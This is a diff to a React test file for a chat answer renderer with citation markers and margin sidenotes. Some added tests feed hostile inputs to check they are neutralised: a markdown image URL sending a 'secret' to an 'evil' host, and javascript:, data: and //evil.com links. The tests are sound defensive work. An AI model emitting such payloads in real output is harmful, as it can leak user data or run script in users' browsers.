@@ -1,9 +1,9 @@
 import { useRef, useState } from "react";
-import { describe, expect, it } from "vitest";
+import { describe, expect, it, vi } from "vitest";
 import { fireEvent, render, screen } from "@testing-library/react";
 import type { Citation } from "@/api/chat";
 import { AnswerText } from "./AnswerText";
-import { Sidenotes } from "./Sidenotes";
+import { Sidenotes, trimQuote } from "./Sidenotes";
 import { citeNumbers } from "./citeMarkers";
 import { getReaderState } from "@/features/reader/useReaderStore";
 
@@ -41,13 +41,38 @@ describe("AnswerText", () => {
   it("streaming without citations shows inert markers and a caret", () => {
     const { container } = r("x [1]", [], true);
     expect(container.querySelector("sup.c.pending")).toBeTruthy();
-    expect(container.querySelector(".caret")).toBeTruthy();
+    expect(container.querySelector(".ans-text.streaming")).toBeTruthy();
+    expect(container.querySelector("sup.c.pending")!.getAttribute("aria-label")).toBe("Source 1");
   });
   it("click opens the doc", () => {
     r("x [1]");
     fireEvent.click(screen.getByRole("button", { name: "Source 1: Doc 1, page 4" }));
     const t = getReaderState().tabs.find((x) => x.docId === "d1");
     expect(t).toMatchObject({ page: 4, chunkId: "c1", version: 2 });
+  });
+  it("never renders images, shows alt as text", () => {
+    const { container } = r("![x](https://evil/x?q=secret)");
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.textContent).toContain("x");
+  });
+  it("blocks unsafe link schemes", () => {
+    const { container } = r("[x](javascript:alert(1)) [y](data:text/html,hi) [z](//evil.com)");
+    expect(container.querySelector("a")).toBeNull();
+    expect(container.textContent).toContain("x");
+  });
+  it("external links are noopener, same-origin plain", () => {
+    const { container } = r("[x](https://example.org) [y](/d/abc)");
+    const [a, b] = [...container.querySelectorAll("a")];
+    expect(a.getAttribute("rel")).toBe("noopener noreferrer");
+    expect(a.getAttribute("target")).toBe("_blank");
+    expect(b.getAttribute("href")).toBe("/d/abc");
+    expect(b.getAttribute("target")).toBeNull();
+  });
+  it("preserves surrounding text; markers in links and math stay literal", () => {
+    const { container } = r("a [1] b [t [2]](/x) $[3]$");
+    expect(container.textContent).toContain("a 1 b");
+    expect(container.querySelectorAll("button.c")).toHaveLength(1);
+    expect(container.querySelector("a")!.textContent).toBe("t [2]");
   });
   it("unavailable marker is not a button", () => {
     const { container } = r("x [1]", [{ n: 1, available: false }]);
@@ -61,8 +86,8 @@ function Harness({ citations }: { citations: Citation[] }) {
   const [hot, setHot] = useState<number | null>(null);
   return (
     <article ref={ref}>
-      <AnswerText text="a [1] b [2]" citations={citations} hot={hot} onHot={setHot} />
-      <Sidenotes citations={citations} order={citeNumbers("a [1] b [2]")} answerRef={ref} hot={hot} onHot={setHot} />
+      <AnswerText text="a [1] b [2] c [3]" citations={citations} hot={hot} onHot={setHot} />
+      <Sidenotes citations={citations} order={citeNumbers("a [1] b [2] c [3]")} answerRef={ref} hot={hot} onHot={setHot} />
     </article>
   );
 }
@@ -78,6 +103,27 @@ describe("Sidenotes", () => {
     fireEvent.click(container.querySelector(".note[data-n='2']")!);
     expect(getReaderState().active).toBe("d2");
   });
+  it("caps at 12 notes with a +1 more trigger", () => {
+    const many = Array.from({ length: 13 }, (_, i) => ok(i + 1));
+    const { container } = render(<Harness citations={many} />);
+    render(<Sidenotes citations={many} order={many.map((c) => c.n)} answerRef={{ current: null }} />, { container });
+    expect(screen.getByText("+1 more sources")).toBeTruthy();
+  });
+  it("positions notes absolutely without overlap", () => {
+    const gcs = vi.spyOn(globalThis, "getComputedStyle").mockReturnValue({ position: "absolute" } as CSSStyleDeclaration);
+    const oh = vi.spyOn(HTMLElement.prototype, "offsetHeight", "get").mockReturnValue(50);
+    vi.spyOn(Element.prototype, "getBoundingClientRect").mockImplementation(function (this: Element) {
+      const n = (this as HTMLElement).dataset?.n;
+      return { top: n ? 100 + Number(n) * 5 : 0 } as DOMRect;
+    });
+    const { container } = render(<Harness citations={cites} />);
+    const tops = [...container.querySelectorAll<HTMLElement>(".note")].map((n) => parseFloat(n.style.top));
+    expect(tops).toHaveLength(3);
+    expect(tops[1]).toBeGreaterThanOrEqual(tops[0] + 58);
+    expect(tops[2]).toBeGreaterThanOrEqual(tops[1] + 58);
+    expect(parseFloat(container.querySelector<HTMLElement>(".margin")!.style.minHeight)).toBeGreaterThan(tops[2]);
+    gcs.mockRestore(); oh.mockRestore(); vi.restoreAllMocks();
+  });
   it("marker hover marks the matching note hot", () => {
     const { container } = render(<Harness citations={cites} />);
     fireEvent.mouseEnter(container.querySelector("button.c[data-n='2']")!);
@@ -86,7 +132,17 @@ describe("Sidenotes", () => {
   });
 });
 
+describe("trimQuote", () => {
+  it("only trims past 160 and cuts on a word boundary", () => {
+    expect(trimQuote("a".repeat(160))).toBe("a".repeat(160));
+    expect(trimQuote("word ".repeat(40))).toMatch(/^(word ){31}word…$/);
+  });
+});
+
 describe("citeNumbers", () => {
+  it("ignores code and math", () => {
+    expect(citeNumbers("`[1]` ```\n[2]\n``` $[3]$ [4]")).toEqual([4]);
+  });
   it("is ordered and unique", () => {
     expect(citeNumbers("[3] x [1,3] [2][1]")).toEqual([3, 1, 2]);
   });
